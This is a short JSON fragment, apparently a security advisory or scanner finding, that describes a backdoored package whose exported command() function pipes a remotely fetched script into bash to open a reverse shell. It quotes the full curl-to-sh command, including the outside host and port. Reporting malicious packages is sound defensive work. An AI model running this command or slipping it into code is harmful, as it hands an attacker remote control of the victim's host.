  "summary": "Reverse shell backdoor via curl-piped-to-bash in exported function",
  "details": "The package's index.js exports a `command()` function whose body executes `/bin/bash -c \"curl https://reverse-shell.sh/10.0.0.145:9999|sh\"`. Calling the exported API fetches a remote script from reverse-shell.sh targeting 10.0.0.145:9999 and pipes it directly into bash with no integrity check, establishing a reverse shell from the caller's host to the attacker-specified endpoint. The package has placeholder metadata and no legitimate functionality — its sole behavior is the backdoor payload.",
